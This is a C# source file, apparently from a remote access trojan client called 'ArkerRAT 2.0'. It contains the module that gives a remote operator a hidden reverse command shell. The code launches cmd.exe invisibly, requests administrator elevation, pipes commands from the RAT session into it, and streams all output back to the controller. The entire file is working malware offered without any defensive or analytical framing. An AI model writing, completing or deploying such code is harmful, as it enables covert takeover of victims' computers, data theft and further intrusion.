using ArkerRATClient;
using System;
using System.Diagnostics;
using System.Threading.Tasks;

namespace ARKERRATCLIENT2._0
{
    public static class ReverseShell
    {
        private static Process cmd;
        private static bool hasStarted = false;
        private static ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd");
        private static string standardError = "";

        private static object lockObject = new object();

        public static void ReverseCMDSession(string data)
        {
            
                if (!hasStarted)
                {
                    processStartInfo.FileName = "cmd.exe";
                    processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                    processStartInfo.UseShellExecute = false;
                    processStartInfo.RedirectStandardInput = true;
                    processStartInfo.RedirectStandardOutput = true;
                    processStartInfo.RedirectStandardError = true;
                    processStartInfo.CreateNoWindow = true;

                processStartInfo.Verb = "runas"; // Run as administrator
                processStartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);

                cmd = new Process();
                    cmd.StartInfo = processStartInfo;
                    cmd.OutputDataReceived += Cmd_OutputDataReceived;
                    cmd.ErrorDataReceived += Cmd_ErrorDataReceived;
                    cmd.EnableRaisingEvents = true;
                    cmd.Exited += Cmd_Exited;

                    cmd.Start();
                    cmd.BeginOutputReadLine();
                    cmd.BeginErrorReadLine();

                    hasStarted = true;
                }

                if (data.Contains("close") || RATClientSession.noConnection)
                {
                    hasStarted = false;
                    cmd.Close();
                }
                else
                {
                    cmd.StandardInput.WriteLine(data);
                }
            
        }

        private static async void Cmd_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                await SendOutputData("§ReverseShellStart§" + e.Data + "\n" + "§ReverseShellEnd§");
            }
        }

        private static async void Cmd_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                standardError += e.Data;
                await SendOutputData("§ReverseShellStart§" + standardError + "\n" + "§ReverseShellEnd§");
                standardError = "";
            }
        }

        private static Task SendOutputData(string output)
        {
            return Task.Run(async () =>
            {
                await RATClientSession.SendData(output);
            });
        }

        private static void Cmd_Exited(object sender, EventArgs e)
        {
            hasStarted = false;
        }
    }
}
